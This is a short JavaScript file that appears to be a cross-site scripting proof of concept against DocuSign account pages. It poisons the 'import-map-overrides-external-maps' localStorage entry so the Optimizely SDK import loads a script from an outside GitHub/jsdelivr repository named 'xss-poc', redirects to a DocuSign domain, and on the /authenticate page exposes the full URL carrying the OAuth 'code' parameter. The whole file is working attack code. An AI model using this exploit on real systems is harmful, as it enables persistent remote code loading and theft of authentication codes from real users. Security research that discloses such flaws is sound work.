System.import('https://docucdn-a.akamaihd.net/production/1ds/libs/@optimizely/optimizely-sdk/4.9.2/dist/optimizely.browser.umd.min.js')

const searchParams = new URLSearchParams(location.search);

if(searchParams.has('code') && location.path ==='/authenticate') {
  alert(location.href);
  console.log(location.href);
} else if(localStorage.getItem('import-map-overrides-external-maps') === null) {
  localStorage.setItem(
    'import-map-overrides-external-maps',
    JSON.stringify([
      {
        imports: {
          "optimizelySdk":"https://cdn.jsdelivr.net/gh/CaTzil/xss-poc@main/docux.js"
        },
      },
    ])
  );
  location.href = 'https://account-d.docusign.com/'
}
